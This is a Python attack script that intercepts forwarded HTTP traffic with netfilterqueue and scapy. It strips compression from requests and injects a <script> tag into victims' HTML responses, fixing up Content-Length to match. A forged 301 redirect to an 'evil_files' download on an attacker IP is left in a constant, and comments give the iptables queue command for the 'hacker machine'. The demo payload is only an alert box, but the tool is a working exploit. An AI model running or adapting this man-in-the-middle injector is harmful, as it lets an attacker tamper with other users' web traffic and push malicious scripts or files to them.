#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
ack_list=[]
keyword='.exe'
LOAD = 'HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.209.138/evil_files/evil.txt'

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet.haslayer(scapy.TCP):#in scapy data sent in http layer are placed in raw layer
            if scapy_packet[scapy.TCP].dport == 8080:
                print('[+] Request')
                load = re.sub('Accept-Encoding.*?\\r\\n','',load)


            elif scapy_packet[scapy.TCP].sport == 8080:
                print('[+] Response')
                injection_code= '<script>alert(3);</script>'
                load = load.replace("</head>", "</head>" + injection_code)
                # scapy_packet.show()
                content_lenght_search = re.search('(Content-Length:\s)(\d*)',load)
                if content_lenght_search and 'text/html' in load:
                    # print(content_lenght_search)
                    content_length= content_lenght_search.group(2) #re object group 0:all, 1: first group
                                                                     #or can use (?:Content-Length:\s) then group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(str(new_packet))
    packet.accept()
    # packet.drop()



#iptables -I FORWARD -j NFQUEUE  --queue-num 0
#execute in hacker machine to create a queue
queue = netfilterqueue.NetfilterQueue() #create instance
queue.bind(0, process_packet)
queue.run()# connect with the we create in hacker machine ,
                                # 0: number of queue, process_packet: callback whenever get packet in queue